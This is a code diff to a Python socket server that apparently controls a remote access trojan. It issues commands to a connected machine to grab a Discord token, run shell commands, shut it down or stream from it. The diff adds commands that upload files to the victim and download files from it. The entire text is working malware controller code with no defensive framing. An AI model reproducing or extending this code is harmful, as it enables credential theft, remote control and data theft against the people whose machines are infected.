@@ -1,6 +1,8 @@
 import socket
+import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('127.0.0.1', 1234))
 s.listen(1)
 
@@ -30,7 +32,7 @@ while True:
 
     if cmd == 'discord_token':
         conn.send(cmd.encode())
-        answer = conn.recv(1024).decode()
+        answer = conn.recv(10240).decode()
         print(answer)
     
     elif cmd == 'shutdown':
@@ -45,10 +47,31 @@ while True:
         conn.send(cmd.encode())
 
     elif cmd == 'put':
-        conn.send(cmd.encode())
+        filename = input('Filename: ').encode()
+        if not os.path.isfile(filename.decode()):
+            print('File not found')
+        else:
+            conn.send(cmd.encode())
+            conn.send(filename)
+            with open(filename.decode(), 'rb') as f:
+                data = f.read()
+                while data:
+                    conn.send(data)
+                    data = f.read()
+            print('File sent successfully')
     
     elif cmd == 'get':
         conn.send(cmd.encode())
+        filename = input('Filename: ').encode()
+        conn.send(filename)
+        found = conn.recv(10240).decode()
+        if found == 'False':
+            print('File not found')
+        else:
+            with open(filename.decode(), 'wb') as f:
+                data = conn.recv(10240000)
+                f.write(data)
+            print('File received successfully')
     
     elif cmd == 'cmd':
         conn.send(cmd.encode())
@@ -56,7 +79,7 @@ while True:
         if not cmd:
             conn.send('cls'.encode())
         conn.send(cmd)
-        answer = conn.recv(1024).decode()
+        answer = conn.recv(10240).decode()
         print(f'Output: \n{answer}')
     
     elif cmd == 'stream':
